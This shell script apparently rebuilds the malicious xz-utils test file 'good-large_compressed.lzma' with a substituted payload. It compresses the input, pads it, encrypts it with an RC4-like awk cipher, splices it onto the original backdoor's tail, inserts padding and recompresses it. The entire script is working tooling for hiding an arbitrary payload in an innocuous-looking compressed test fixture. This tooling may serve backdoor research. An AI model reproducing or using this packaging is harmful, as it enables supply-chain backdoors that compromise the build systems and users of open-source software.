original_malicious_file="good-large_compressed.lzma"
W=88792
N=0

# Create temp dir
mkdir -p tmp

# Extract the bottom part of the original malicious file, which contains the original payload
# This file will be used later to recreate the malicious "good-large_compressed.lzma" file
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)"
(xz -dc $original_malicious_file | eval $i |tail -c +31265) > tmp/original_bottom_part

# Compress the payload
cat $1 | xz -c > tmp/payload_compressed

# Get the size of the created file
size=$(stat -c "%s" tmp/payload_compressed)

# Add null bytes at the end of file to reach size of 33492 bytes
dd if=/dev/zero bs=1 count=$((33492 - $size)) >> tmp/payload_compressed status=none

# Encrypt the file
cat tmp/payload_compressed | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v-k+m)%m}' > tmp/payload_compressed_encrypted

# Merge with the bottom part of the original malicious file
cat tmp/payload_compressed_encrypted tmp/original_bottom_part > tmp/payload_compressed_encrypted_merged

# Add 1024 bytes of padding every 2048 bytes
python3 ./add_padding.py tmp/payload_compressed_encrypted_merged tmp/payload_compressed_encrypted_merged_padded

# Compress again the file
cat tmp/payload_compressed_encrypted_merged_padded | xz -c > good-large_compressed.lzma.modified

# Delete temp files
#rm -rf tmp

